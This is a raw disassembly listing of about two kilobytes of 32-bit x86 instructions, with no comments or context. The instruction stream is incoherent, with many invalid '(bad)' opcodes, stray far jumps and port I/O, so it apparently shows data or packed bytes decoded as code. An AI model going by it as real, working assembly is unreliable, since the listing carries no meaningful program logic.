  417877:	imul   edx,DWORD PTR [edi+0x9],0xffffffaa
  41787b:	push   ebx
  41787c:	pop    esp
  41787d:	cdq    
  41787e:	fimul  WORD PTR [ecx+esi*2+0x7fe5baab]
  417885:	ins    DWORD PTR es:[edi],dx
  417886:	arpl   dx,ax
  417888:	scas   eax,DWORD PTR es:[edi]
  417889:	or     al,0x72
  41788b:	mov    gs,eax
  41788d:	cli    
  41788e:	push   ds
  41788f:	loopne 0x41781c
  417891:	ins    BYTE PTR es:[edi],dx
  417892:	scas   al,BYTE PTR es:[edi]
  417893:	pop    esi
  417894:	inc    ecx
  417895:	push   ecx
  417896:	std    
  417897:	mov    ah,0xaf
  417899:	cmp    BYTE PTR [edi+0x6f],dl
  41789c:	jge    0x4178d8
  41789e:	jb     0x417894
  4178a0:	lods   eax,DWORD PTR ds:[esi]
  4178a1:	neg    DWORD PTR [edx-0x15]
  4178a4:	dec    edx
  4178a5:	es xor al,0x5
  4178a8:	push   eax
  4178a9:	pop    ebp
  4178aa:	jne    0x417925
  4178ac:	jmp    0x79d9:0xf126c625
  4178b3:	add    ebp,DWORD PTR [ebx+esi*2+0x2c57499d]
  4178ba:	add    bl,cl
  4178bc:	dec    esi
  4178bd:	pop    es
  4178be:	inc    ebx
  4178bf:	pop    es
  4178c0:	mov    bh,0xd9
  4178c2:	fs test eax,0xdc05cac2
  4178c9:	(bad)  
  4178ca:	cld    
  4178cb:	push   ds
  4178cc:	(bad)  ds:0xd1b469e7
  4178d2:	sub    al,0x17
  4178d4:	repz scas al,BYTE PTR es:[edi]
  4178d6:	dec    ecx
  4178d7:	sti    
  4178d8:	fdiv   st(2),st
  4178da:	xor    eax,0x8249917e
  4178df:	or     ch,BYTE PTR [esi+0x34e82bf9]
  4178e5:	pop    esi
  4178e6:	or     bl,BYTE PTR [esi]
  4178e8:	ficomp DWORD PTR [edi]
  4178ea:	jle    0x41787d
  4178ec:	retf   
  4178ed:	cmp    edi,DWORD PTR [ebp+0x27c74402]
  4178f3:	imul   ebx,DWORD PTR ds:0x6fd31d08,0x9467561d
  4178fd:	cs adc al,0x80
  417900:	cmc    
  417901:	mov    al,0x2
  417903:	cld    
  417904:	add    DWORD PTR [ebx-0x7c],ecx
  417907:	int    0x5c
  417909:	loop   0x417968
  41790b:	xchg   esi,eax
  41790c:	pop    esi
  41790d:	xlat   BYTE PTR ds:[ebx]
  41790e:	retfw  0xc411
  417912:	add    ebx,eax
  417914:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417915:	jnp    0x4178f5
  417917:	sub    esi,DWORD PTR [ebp-0x24]
  41791a:	sbb    ecx,ebx
  41791c:	adc    al,0xbb
  41791e:	add    dl,BYTE PTR [eax-0x7ef7cdb7]
  417924:	das    
  417925:	js     0x4178aa
  417927:	es pop esi
  417929:	fcmovb st,st(6)
  41792b:	outs   dx,BYTE PTR ds:[esi]
  41792c:	jae    0x417901
  41792e:	out    0x81,eax
  417930:	in     al,0x68
  417932:	test   eax,0xe57ad906
  417937:	jmp    0xfcdd3db0
  41793c:	loope  0x4178cb
  41793e:	jg     0x417943
  417940:	lock dec edx
  417942:	xor    dl,BYTE PTR [ebp+0x2b]
  417945:	dec    ebp
  417946:	mov    cl,0x3f
  417948:	rcl    DWORD PTR [edi+0x6f9f4d4e],cl
  41794e:	push   ebp
  41794f:	rol    BYTE PTR [ebx+0x38b04128],1
  417955:	mov    ds:0x1e637a04,al
  41795a:	mov    ah,0x4b
  41795c:	inc    esp
  41795d:	imul   edx,DWORD PTR [edi+esi*2],0x3f
  417961:	call   0x75463778
  417966:	fisub  DWORD PTR [ebx-0x37]
  417969:	pop    ebx
  41796a:	jae    0x41794a
  41796c:	push   esp
  41796d:	pop    ebp
  41796e:	sub    ebx,DWORD PTR [ebx+esi*8-0x23]
  417972:	mov    ecx,0xc1d4d2d9
  417977:	popf   
  417978:	jns    0x4179c4
  41797a:	inc    edx
  41797b:	daa    
  41797c:	jb     0x4179e5
  41797e:	ins    BYTE PTR es:[edi],dx
  41797f:	repz pop ebx
  417981:	mov    DWORD PTR [ecx],ebp
  417983:	icebp  
  417984:	(bad)  
  417985:	cmp    eax,0xf8a8e3d3
  41798a:	mov    ds:0x50f40e5c,eax
  41798f:	mov    DWORD PTR [edx+edx*2-0x165ad28c],esp
  417996:	add    BYTE PTR [ebx+0x6ec11f4e],cl
  41799c:	adc    ebx,ebx
  41799e:	dec    esi
  41799f:	mov    cl,0xea
  4179a1:	imul   esi,DWORD PTR [edi+ecx*8+0x5019386f],0xffffff8d
  4179a9:	jp     0x41793e
  4179ab:	push   0xd9b5b20c
  4179b0:	(bad)
  4179b3:	and    al,0xce
  4179b5:	adc    al,0x6
  4179b7:	mov    eax,ds:0xdc49a6ac
  4179bc:	shl    DWORD PTR [ecx],cl
  4179be:	icebp  
  4179bf:	or     BYTE PTR [eax-0x33cfa758],bl
  4179c5:	ds dec ax
  4179c8:	add    al,0x89
  4179ca:	add    eax,0x13e70283
  4179cf:	adc    bh,BYTE PTR [esi+eax*1]
  4179d2:	and    DWORD PTR [esi-0x1ad30db9],eax
  4179d8:	mov    esi,0xf32bb4c1
  4179dd:	pop    es
  4179de:	(bad)  
  4179df:	jmp    0xd0e36521
  4179e4:	dec    ebp
  4179e5:	ins    DWORD PTR es:[edi],dx
  4179e6:	adc    DWORD PTR ds:0x9676160b,ebx
  4179ec:	jecxz  0x4179d2
  4179ee:	in     eax,dx
  4179ef:	mov    ?,ecx
  4179f1:	inc    ebp
  4179f2:	jg     0x417989
  4179f4:	cld    
  4179f5:	sub    esi,DWORD PTR [ecx]
  4179f7:	sbb    dl,BYTE PTR [edi-0x5279849a]
  4179fd:	mov    eax,ds:0x6297b454
  417a02:	cld    
  417a03:	or     al,0x3b
  417a05:	daa    
  417a06:	inc    esi
  417a07:	test   ah,cl
  417a09:	adc    eax,0xcfe569e6
  417a0e:	out    0x79,al
  417a10:	popf   
  417a11:	nop
  417a12:	inc    BYTE PTR [edi]
  417a14:	addr16 pushf 
  417a16:	inc    edi
  417a17:	inc    ebx
  417a18:	adc    cl,BYTE PTR [ecx+eax*4-0x5fb7bc8b]
  417a1f:	jmp    0x417a16
  417a21:	sahf   
  417a22:	push   ebx
  417a23:	xor    DWORD PTR [ebx-0x24c55e87],eax
  417a29:	push   ds
  417a2a:	cmp    ch,BYTE PTR [ecx-0x71]
  417a2d:	inc    edi
  417a2e:	jbe    0x417a85
  417a30:	jne    0x417a92
  417a32:	rol    DWORD PTR [edi],0x3
  417a35:	fs stos BYTE PTR es:[edi],al
  417a37:	sar    BYTE PTR [edx],0x30
  417a3a:	inc    edx
  417a3b:	mov    edi,0xa3d0cf75
  417a40:	jmp    0x84f2:0x15107ee7
  417a47:	sbb    al,0x1a
  417a49:	pop    esp
  417a4a:	int3   
  417a4b:	adc    bh,BYTE PTR [ebx-0x23]
  417a4e:	mul    BYTE PTR [esi-0x1b]
  417a51:	lahf   
  417a52:	xchg   esp,eax
  417a53:	fbstp  TBYTE PTR [ebx-0xc]
  417a56:	repnz xchg ebx,eax
  417a58:	adc    eax,0xaf2b6fe8
  417a5d:	adc    al,0x10
  417a5f:	xchg   esp,eax
  417a60:	xor    esi,edx
  417a62:	fild   DWORD PTR [ebp+ebp*2+0xc]
  417a66:	cld    
  417a67:	jle    0x417aaa
  417a69:	mov    WORD PTR [edx-0x65003d99],es
  417a6f:	(bad)
  417a73:	adc    DWORD PTR [edx],eax
  417a75:	xor    eax,0xd665fd24
  417a7a:	fstp   QWORD PTR [ecx]
  417a7c:	push   ss
  417a7d:	scas   al,BYTE PTR es:[edi]
  417a7e:	push   ss
  417a7f:	pop    ecx
  417a80:	or     BYTE PTR [eax+0x3b],bl
  417a83:	std    
  417a84:	cmp    esi,0x6
  417a87:	push   edx
  417a88:	arpl   WORD PTR [ebp+0x72],dx
  417a8b:	adc    esp,ecx
  417a8d:	(bad)  
  417a8f:	push   edi
  417a90:	adc    eax,0x2a4e4071
  417a95:	add    al,0x9e
  417a97:	cld    
  417a98:	icebp  
  417a99:	addr16 jo 0x417a71
  417a9c:	(bad)  [ecx+0x31]
  417a9f:	not    DWORD PTR [edi]
  417aa1:	scas   eax,DWORD PTR es:[edi]
  417aa2:	xchg   edx,eax
  417aa3:	pop    es
  417aa4:	adc    al,0x20
  417aa6:	out    dx,eax
  417aa7:	stos   DWORD PTR es:[edi],eax
  417aa8:	jb     0x417a55
  417aaa:	pop    ss
  417aab:	clc    
  417aac:	ins    DWORD PTR es:[edi],dx
  417aad:	(bad)  
  417aae:	repz es aam 0x88
  417ab2:	jae    0x417a92
  417ab4:	mov    al,ds:0x72295410
  417ab9:	call   0xfca4:0x8e885ce6
  417ac0:	daa    
  417ac1:	or     esi,ebx
  417ac3:	fmul   QWORD PTR [eax-0x1a46cd06]
  417ac9:	xchg   esi,eax
  417aca:	or     edx,DWORD PTR [ebp-0x38]
  417acd:	dec    eax
  417ace:	daa    
  417acf:	enter  0xb7ab,0xab
  417ad3:	sti    
  417ad4:	test   eax,0xd14aa54f
  417ad9:	pop    esi
  417ada:	hlt    
  417adb:	fs jnp 0x417a61
  417ade:	xor    BYTE PTR [edi+0x3257ef1f],ah
  417ae4:	jne    0x417b1f
  417ae6:	and    BYTE PTR [edx+ebx*8+0x1],bh
  417aea:	out    dx,al
  417aeb:	xchg   ebp,eax
  417aec:	xchg   ebp,eax
  417aed:	jne    0x417b30
  417aef:	mov    ebx,0x53039c5e
  417af4:	pop    esi
  417af5:	out    dx,eax
  417af6:	(bad)  
  417af7:	lods   eax,DWORD PTR ds:[esi]
  417af8:	out    dx,eax
  417af9:	xor    al,0x22
  417afb:	cdq    
  417afc:	dec    DWORD PTR [esi+0x2f66e43f]
  417b02:	mov    edx,0x501fd432
  417b07:	jo     0x417aef
  417b09:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417b0a:	sbb    eax,0x97b4a377
  417b0f:	call   0xfede:0xd5876d6c
  417b16:	add    bl,ch
  417b18:	jns    0x417b96
  417b1a:	outs   dx,BYTE PTR ds:[esi]
  417b1b:	cmp    al,0x54
  417b1d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417b1e:	inc    esp
  417b1f:	xor    DWORD PTR [esp+ecx*4],esp
  417b22:	cmp    eax,0x29fc72fb
  417b27:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417b28:	or     bh,ah
  417b2a:	sbb    ebp,DWORD PTR [eax]
  417b2c:	out    0x69,al
  417b2e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417b2f:	gs cs cmp al,0xa4
  417b33:	dec    esp
  417b34:	pop    esi
  417b35:	inc    ebp
  417b36:	mov    bl,0xb5
  417b38:	dec    esp
  417b39:	ffree  st(4)
  417b3b:	imul   ebp
  417b3d:	pop    edi
  417b3e:	in     eax,dx
  417b3f:	aas    
  417b40:	inc    ecx
  417b41:	cli    
  417b42:	out    dx,eax
  417b43:	mov    esp,0xc7a20e29
  417b48:	pushf  
  417b49:	jae    0x417b94
  417b4b:	pop    es
  417b4c:	icebp  
  417b4d:	jecxz  0x417b43
  417b4f:	jae    0x417bad
  417b51:	ss mov ecx,0x81916bac
  417b57:	jmp    0x9f1f:0x7b22d8
  417b5e:	into   
  417b5f:	or     eax,0x9132e073
  417b64:	pop    edi
  417b65:	mov    bh,BYTE PTR [edx]
  417b67:	int3   
  417b68:	call   0x8f95a67a
  417b6d:	lea    edi,[ebp+0x29ac79b5]
  417b73:	ins    DWORD PTR es:[edi],dx
  417b74:	dec    eax
  417b75:	jmp    0x417be7
  417b77:	enter  0x8dba,0xe1
  417b7b:	sub    esp,esp
  417b7d:	imul   ebx,DWORD PTR [eax-0x4c],0x13
  417b81:	dec    esi
  417b82:	inc    edi
  417b83:	pop    DWORD PTR [ebp+0x475df20b]
  417b89:	push   ebp
  417b8a:	push   0xffffffbf
  417b8c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417b8d:	cmp    al,0x6
  417b8f:	dec    ebp
  417b90:	push   cs
  417b91:	dec    ecx
  417b92:	push   ds
  417b93:	jae    0x417ba3
  417b95:	sbb    ah,BYTE PTR [eax]
  417b97:	xor    DWORD PTR [esi+edi*1-0x5f],0x7d
  417b9c:	mov    bh,0x6b
  417b9e:	and    bh,BYTE PTR [ebx+0x10c652c0]
  417ba4:	adc    DWORD PTR [ebx-0x3c],esp
  417ba7:	jns    0x417bdd
  417ba9:	xchg   esp,eax
  417baa:	pop    esi
  417bab:	cmp    al,0x90
  417bad:	clc    
  417bae:	into   
  417baf:	outs   dx,DWORD PTR ds:[esi]
  417bb0:	xor    DWORD PTR ds:0xebef4a81,0xfffffff1
  417bb7:	int    0x36
  417bb9:	pop    esp
  417bba:	repz xor BYTE PTR [eax-0x24],0xc8
  417bbf:	out    dx,al
  417bc0:	pop    edi
  417bc1:	test   eax,0x28f6c3d2
  417bc6:	fisttp QWORD PTR [edx-0x74]
  417bc9:	adc    DWORD PTR [eax-0x34952829],ebp
  417bcf:	push   esi
  417bd0:	sbb    DWORD PTR gs:[eax+0x7f1814d5],esi
  417bd7:	mov    bh,0xaf
  417bd9:	or     ah,bl
  417bdb:	inc    ebx
  417bdc:	mov    eax,ds:0x11eaed3
  417be1:	scas   eax,DWORD PTR es:[edi]
  417be2:	test   BYTE PTR [eax-0x5e],0x79
  417be6:	or     dl,BYTE PTR [edx-0x57f72f90]
  417bec:	mov    ecx,0xc0cb7972
  417bf1:	arpl   WORD PTR [esi+0x357b596b],ax
  417bf7:	(bad)  
  417bf8:	cs jmp 0x92f95411
  417bfe:	je     0x417bb5
  417c00:	lock adc esi,edi
  417c03:	pop    es
  417c04:	je     0x4d776e30
  417c0a:	cmc    
  417c0b:	imul   esp,edi,0xece915c7
  417c11:	bnd jp 0x417bd0
  417c14:	test   eax,0x103dbbf8
  417c19:	ins    DWORD PTR es:[edi],dx
  417c1a:	iret   
  417c1b:	test   eax,0xfc6877ba
  417c20:	loopne 0x417c8a
  417c22:	stc    
  417c23:	or     eax,DWORD PTR ds:0x5f344760
  417c29:	lea    esi,[ebp-0x7b394e14]
  417c2f:	xor    DWORD PTR [ebp-0x4006e700],ebx
  417c35:	fistp  DWORD PTR [ecx+0x31]
  417c38:	inc    ebx
  417c39:	repz rcr DWORD PTR [edi],1
  417c3c:	jne    0x417c2a
  417c3e:	mov    ch,0x10
  417c40:	std    
  417c41:	(bad)  
  417c42:	clc    
  417c43:	or     DWORD PTR gs:[edx],eax
  417c46:	add    ecx,edx
  417c48:	in     al,dx
  417c49:	ror    ebx,cl
  417c4b:	mov    ax,0xc147
  417c4f:	inc    eax
  417c50:	push   0xffffff89
  417c52:	ja     0x417bdb
  417c54:	mov    bl,0x8c
  417c56:	or     al,0xb2
  417c58:	xchg   esi,eax
  417c59:	jns    0x417c32
  417c5b:	sahf   
  417c5c:	mov    eax,ds:0xd2e34c6c
  417c61:	dec    ebx
  417c62:	cmp    dl,BYTE PTR [ecx+0x176f63f7]
  417c68:	mov    ah,0xe5
  417c6a:	xchg   edx,eax
  417c6b:	enter  0xd9d,0x51
  417c6f:	add    eax,0x6c68605a
  417c74:	add    ch,BYTE PTR [ebx]
  417c76:	inc    ecx
  417c77:	sub    eax,0xcbd4ff0c
  417c7c:	pop    edx
  417c7d:	stc    
  417c7e:	or     esi,DWORD PTR [ecx+0x4]
  417c81:	xlat   BYTE PTR ds:[ebx]
  417c82:	ret    
  417c83:	and    bl,bl
  417c85:	bound  ecx,QWORD PTR [eax]
  417c87:	adc    eax,ecx
  417c89:	xchg   ecx,eax
  417c8a:	jmp    0x6e98bd8a
  417c8f:	dec    edx
  417c90:	or     DWORD PTR [eax+0xf],0xffffff80
  417c94:	imul   esp,DWORD PTR [ecx],0x72
	...
  417d12:	add    BYTE PTR [eax],al
  417d14:	mov    esp,0xf767f68f
  417d19:	jg     0x417cd8
  417d1b:	fist   WORD PTR [esi+0x6dba792d]
  417d21:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417d22:	pop    es
  417d23:	gs pushf 
  417d25:	pop    ds
  417d26:	add    DWORD PTR [eax],eax
  417d28:	imul   eax,DWORD PTR [edi],0x0
  417d2b:	add    BYTE PTR [ecx-0x29],ch
  417d2e:	ins    DWORD PTR es:[edi],dx
  417d2f:	lds    esi,FWORD PTR [ecx-0x6410a540]
  417d35:	mov    ebx,0xcbe4895e
  417d3a:	hlt    
  417d3b:	sbb    edi,DWORD PTR [edi+0x2e]
  417d3e:	pop    eax
  417d3f:	push   edi
  417d40:	sub    edx,DWORD PTR [edx]
  417d42:	ins    DWORD PTR es:[edi],dx
  417d43:	jb     0x417dbe
  417d45:	shl    BYTE PTR [edi-0x44],0x35
  417d49:	add    BYTE PTR [ecx],ah
  417d4b:	sub    dl,dh
  417d4d:	sub    al,0x9
  417d4f:	pop    ds
  417d50:	sub    DWORD PTR ds:0x66a27051,0x56842ef5
  417d5a:	nop
  417d5b:	pop    ds
  417d5c:	mov    ds:0xdebf1d9d,eax
  417d61:	add    cl,BYTE PTR [esi+0x3c]
  417d64:	cmp    DWORD PTR [ecx+eiz*4+0x1f],ebx
  417d68:	adc    al,0x97
  417d6a:	add    DWORD PTR [esi+0x6ebd1b12],ecx
  417d70:	retf   
  417d71:	js     0x417d3b
  417d73:	into   
  417d74:	add    bl,bl
  417d76:	fbld   TBYTE PTR [eax]
  417d78:	push   ss
  417d79:	sbb    eax,0x29a38c3c
  417d7e:	xchg   ebp,eax
  417d7f:	jmp    0xe5548f58
  417d84:	frstor [esi]
  417d86:	scas   eax,DWORD PTR es:[edi]
  417d87:	(bad)  
  417d89:	into   
  417d8a:	mov    eax,0x627fa346
  417d8f:	and    ecx,DWORD PTR [eax-0x63]
  417d92:	leave  
  417d93:	idiv   DWORD PTR es:[edx]
  417d96:	fimul  WORD PTR [edi]
  417d98:	inc    esi
  417d99:	mov    DWORD PTR [edi],0x3d2a3844
  417d9f:	jmp    esi
  417da1:	fcom   QWORD PTR [ebx*1+0x4a60b1f8]
  417da8:	popf   
  417da9:	fimul  WORD PTR [edi]
  417dab:	xchg   BYTE PTR [edx+ebx*2-0x5521a475],bl
  417db2:	jnp    0x417d74
  417db4:	scas   al,BYTE PTR es:[edi]
  417db5:	and    BYTE PTR [ecx],cl
  417db7:	mov    eax,0x3038185f
  417dbc:	aas    
  417dbd:	jmp    0xb41:0xaf00cc4b
  417dc4:	add    ebx,DWORD PTR [ecx]
  417dc6:	dec    ebp
  417dc7:	cmp    ebp,edi
  417dc9:	es inc ebx
  417dcb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417dcc:	sbb    eax,0xff320d62
  417dd1:	mov    bl,0xb4
  417dd3:	sbb    DWORD PTR [ebp-0xa409896],edi
  417dd9:	leave  
  417dda:	jne    0x417dfe
  417ddc:	xor    al,0xbe
  417dde:	repnz (bad) 
  417de0:	hlt    
  417de1:	xor    al,0x46
  417de3:	popa   
  417de4:	pushf  
  417de5:	mov    ecx,DWORD PTR [edx-0x53]
  417de8:	xor    al,0x79
  417dea:	lods   eax,DWORD PTR ds:[esi]
  417deb:	arpl   sp,bp
  417ded:	jmp    0x383d:0x5dc3f4d4
  417df4:	and    ah,al
  417df6:	nop
  417df7:	loope  0x417df4
  417df9:	or     esp,esi
  417dfb:	mov    cl,0x7b
  417dfd:	out    0xce,eax
  417dff:	out    dx,eax
  417e00:	scas   al,BYTE PTR es:[edi]
  417e01:	add    BYTE PTR [esp+eax*8],bh
  417e04:	push   cs
  417e05:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417e06:	pushf  
  417e07:	push   es
  417e08:	xor    al,0x33
  417e0a:	mov    eax,0x4e1c09ff
  417e0f:	lock or edi,esi
  417e12:	out    dx,eax
  417e13:	rep ins DWORD PTR es:[edi],dx
  417e15:	mov    bl,0x59
  417e17:	push   ecx
  417e18:	pop    es
  417e19:	mov    esi,0xbffd561d
  417e1e:	adc    al,0xdd
  417e20:	cld    
  417e21:	dec    ebx
  417e22:	sub    eax,0x726b3f87
  417e27:	popa   
  417e28:	pop    ebx
  417e29:	enter  0x3343,0x70
  417e2d:	mov    BYTE PTR [ebx],dl
  417e2f:	push   edi
  417e30:	std    
  417e31:	mov    ch,0x5e
  417e33:	aad    0x66
  417e35:	add    eax,0xc141f4eb
  417e3a:	xor    ebx,DWORD PTR [esi+0x60fc002f]
  417e40:	es push esi
  417e42:	dec    ebp
  417e43:	xchg   al,cl
  417e45:	sbb    esp,esi
  417e47:	inc    esi
  417e48:	push   ds
  417e49:	or     bh,BYTE PTR [eax+0x2a95f9ec]
  417e4f:	and    eax,0x4a5a6a3b
  417e54:	mov    ds:0xb9e90d54,al
  417e59:	dec    esp
  417e5a:	sbb    al,0xd0
  417e5c:	lods   al,BYTE PTR ds:[esi]
  417e5d:	mov    al,0x5d
  417e5f:	ss pop es
  417e61:	xchg   DWORD PTR [ecx+0x65],ebx
  417e64:	enter  0x9b22,0x7a
  417e68:	mov    bl,0x12
  417e6a:	mov    al,0xae
  417e6c:	xor    eax,0xf63ad65c
  417e71:	sbb    BYTE PTR [esi-0x67],dh
  417e74:	cmp    BYTE PTR [ebp-0x11],cl
  417e77:	sahf   
  417e78:	leave  
  417e79:	dec    ebx
  417e7a:	mov    ebx,0x403235d5
  417e7f:	add    DWORD PTR [eax+ebp*8],0x674b9fa9
  417e86:	neg    DWORD PTR [edi+0x8]
  417e89:	inc    ebx
  417e8a:	mov    ch,0x4c
  417e8c:	ret    
  417e8d:	fldenv [ebx-0x2c]
  417e90:	push   esi
  417e91:	pop    esi
  417e92:	inc    edi
  417e93:	inc    esp
  417e94:	pop    ebp
  417e95:	jmp    0x1042:0xeab3cc62
  417e9c:	(bad)  [ecx]
  417e9e:	sbb    eax,0x90794497
  417ea3:	adc    BYTE PTR [ebp-0xf53f06a],al
  417ea9:	pop    esi
  417eaa:	push   ss
  417eab:	hlt    
  417eac:	cs leave 
  417eae:	jp     0x417eec
  417eb0:	cmp    esi,DWORD PTR [ebx+0x480d6430]
  417eb6:	mov    al,ds:0x8f49b3d
  417ebb:	mov    dh,0xde
  417ebd:	icebp  
  417ebe:	cmp    esp,ebp
  417ec0:	out    0x71,eax
  417ec2:	pshufw mm3,QWORD PTR [edi],0x87
  417ec6:	mov    al,ds:0x8ccd644a
  417ecb:	(bad)  
  417ecc:	or     DWORD PTR ds:0x8f7924b3,edx
  417ed2:	sub    eax,0xa3dc6b2b
  417ed7:	inc    ebp
  417ed8:	cwde   
  417ed9:	scas   al,BYTE PTR es:[edi]
  417eda:	adc    ch,BYTE PTR [bp-0x5c]
  417ede:	jg     0x417e86
  417ee0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417ee1:	lds    edi,FWORD PTR [edx+ecx*4]
  417ee4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417ee5:	ret    
  417ee6:	add    eax,0x3d5e87b2
  417eeb:	cmp    ax,0xe721
  417eef:	pop    esp
  417ef0:	repz add esp,DWORD PTR ds:0xaa6e9109
  417ef7:	adc    eax,DWORD PTR [ebp-0x24beaaee]
  417efd:	dec    esi
  417efe:	jmp    0x993f56c2
  417f03:	mov    edx,0xf65928c1
  417f08:	xchg   ecx,eax
  417f09:	pop    eax
  417f0a:	or     cl,BYTE PTR [ecx-0x3c]
  417f0d:	ds je  0x417f81
  417f10:	ja     0x417eed
  417f12:	and    esp,DWORD PTR [ebx-0x57]
  417f15:	xor    ah,BYTE PTR [edx-0x25c7834e]
  417f1b:	js     0x417f14
  417f1d:	push   ebp
  417f1e:	jo     0x417ea9
  417f20:	xor    ebx,DWORD PTR [eax]
  417f22:	retf   0x421a
  417f25:	in     al,dx
  417f26:	fld    TBYTE PTR [edi+esi*4-0x5f]
  417f2a:	dec    edx
  417f2b:	lahf   
  417f2c:	daa    
  417f2d:	jg     0x417eb6
  417f2f:	mov    ah,0xb6
  417f31:	pop    edx
  417f32:	jnp    0x417f05
  417f34:	xor    al,0x3a
  417f36:	mov    ebp,DWORD PTR [ebp+0x136e4f49]
  417f3c:	sub    esp,ebx
  417f3e:	xor    BYTE PTR [ebp-0x4378dd1],dh
  417f44:	call   0x6ddf1a02
  417f49:	cmp    ebx,DWORD PTR [ecx-0x17]
  417f4c:	fnsave ds:0x115b8fc9
  417f52:	push   0xb7707cc4
  417f57:	hlt    
  417f58:	iret   
  417f59:	mov    dl,0x8f
  417f5b:	sbb    edi,ebx
  417f5d:	sahf   
  417f5e:	pop    edi
  417f5f:	and    BYTE PTR [edi-0x68a74f6b],al
  417f65:	out    dx,al
  417f66:	xor    al,0x36
  417f68:	aam    0xe1
  417f6a:	stos   BYTE PTR es:[edi],al
  417f6b:	lds    edi,FWORD PTR [eax]
  417f6d:	mov    ebp,0xf6ac6c7f
  417f72:	pop    esi
  417f73:	dec    edi
  417f74:	push   ebx
  417f75:	test   al,0x8f
  417f77:	inc    edx
  417f78:	test   eax,0x165c7051
  417f7d:	enter  0xc208,0x5a
  417f81:	imul   ecx,DWORD PTR [esi-0x75409050],0x89c76ce6
  417f8b:	nop
  417f8c:	cli    
  417f8d:	sub    DWORD PTR [ecx+0x7ccb2a15],esp
  417f93:	pop    ebp
  417f94:	dec    esp
  417f95:	pop    ebx
  417f97:	sub    eax,ebp
  417f99:	jne    0x418019
  417f9b:	icebp  
  417f9c:	cmp    eax,0x248905c3
  417fa1:	push   esp
  417fa2:	add    al,0x1e
  417fa4:	(bad)  
  417fa5:	ins    DWORD PTR es:[edi],dx
  417fa6:	and    eax,0x4b98ebaa
  417fab:	push   esi
  417fac:	push   esp
  417fad:	add    cl,0x7c
  417fb0:	add    BYTE PTR [edx+ebp*8+0x47b99d8d],al
  417fb7:	cmc    
  417fb8:	ret    0x73e8
  417fbb:	pop    esp
  417fbc:	mov    es,WORD PTR ds:0x894c955e
  417fc2:	hlt    
  417fc3:	inc    ebx
  417fc4:	push   0x7a
  417fc6:	and    al,0x17
  417fc8:	or     al,0x2e
  417fca:	lds    edi,FWORD PTR [ebx]
  417fcc:	push   esp
  417fcd:	cmp    DWORD PTR [edi],ebx
  417fcf:	call   0x8243:0xbff76a20
  417fd6:	ja     0x41802a
  417fd8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417fd9:	sti    
  417fda:	mov    ecx,0x187ed53b
  417fdf:	arpl   WORD PTR [eax-0x5385b57f],di
  417fe5:	pop    edx
  417fe6:	push   edx
  417fe7:	jae    0x417f8b
  417fe9:	idiv   BYTE PTR [edx]
  417feb:	push   esi
  417fec:	ja     0x417fc6
  417fee:	and    eax,0x7edea59b
  417ff3:	xor    BYTE PTR [ebp+0x3afc0810],0x45
  417ffa:	mov    ss,eax
  417ffc:	fist   WORD PTR [ecx]
  417ffe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417fff:	jae    0x417f8b
  418001:	int    0x79
  418003:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418004:	pop    esp
  418005:	mov    esp,DWORD PTR [edi]
  418007:	call   FWORD PTR [edi+0x20435098]
  41800d:	out    0x1,eax
  41800f:	push   0x2b
  418011:	test   BYTE PTR [edx+0x73],ah
  418014:	(bad)  
  418015:	outs   dx,BYTE PTR ds:[esi]
  418016:	inc    ebp
  418017:	pop    edi
  418018:	pop    eax
  418019:	dec    ebp
  41801a:	daa    
  41801b:	jecxz  0x418062
  41801d:	mov    al,0xab
  41801f:	enter  0xdee0,0xec
  418023:	ja     0x418006
  418025:	bound  edi,QWORD PTR [eax+ebx*8]
  418028:	sbb    eax,0x3f86e2d4
  41802d:	call   DWORD PTR [eax-0x6ddfdcc3]
  418033:	mov    edx,edi
  418035:	mov    eax,ds:0x28b3e59a
  41803a:	xchg   ebp,eax
  41803b:	dec    ecx
  41803c:	cdq    
  41803d:	scas   al,BYTE PTR es:[edi]
  41803e:	call   0x7ece:0x60ffa241
  418045:	sub    BYTE PTR [esp+0x1a],0x27
  41804a:	jne    0x41805b
  41804c:	aam    0x85
  41804e:	repnz outs dx,BYTE PTR ds:[esi]
  418050:	xlat   BYTE PTR ds:[ebx]
  418051:	hlt    
  418052:	and    al,0x8c
  418054:	call   0xdc4a2d4f
  418059:	sbb    BYTE PTR [edi+eiz*8],al
  41805c:	push   ds
  41805d:	mov    ch,cl
  41805f:	aas    
  418060:	mov    bh,0x68
  418062:	fwait
  418063:	sahf   
  418064:	push   ecx
  418065:	pop    edx
  418066:	xor    eax,DWORD PTR [esi-0x76]
  418069:	dec    ebx
  41806a:	inc    ebp
  41806b:	dec    edi
  41806c:	fild   DWORD PTR [esi-0x6ed09bd6]
  418072:	lea    ebp,[esi+0x45c66e10]
  418078:	adc    DWORD PTR [edx+ecx*2-0x61],esp
  41807c:	dec    esi
  41807d:	nop
  41807e:	adc    ebp,ebp
  418080:	push   0xe167fc87
  418085:	dec    esp
  418086:	mov    ebp,DWORD PTR [eax+0x54cf806]
  41808c:	jg     0x41809e
  41808e:	jne    0x41803f
  418090:	lea    edi,[eax+0x398c0bc8]
  418096:	adc    BYTE PTR [esi+0x4f6c0da8],bh
  41809c:	mov    ebx,0x657068f4
  4180a1:	in     al,0xba
  4180a3:	jnp    0x418090
  4180a5:	cdq    
  4180a6:	icebp  
  4180a7:	jg     0x4180ba
  4180a9:	call   0xb979:0xcee832d2
  4180b0:	test   DWORD PTR [eax],0xfee4b43
  4180b6:	mov    ebx,0xf5cd847
  4180bb:	pop    edi
  4180bc:	addr16 cs nop
  4180bf:	pop    ebx
  4180c0:	outs   dx,DWORD PTR ds:[esi]
  4180c1:	mov    dl,0x50
  4180c3:	pop    ds
  4180c4:	sub    DWORD PTR [esp+ecx*1-0x42],edx
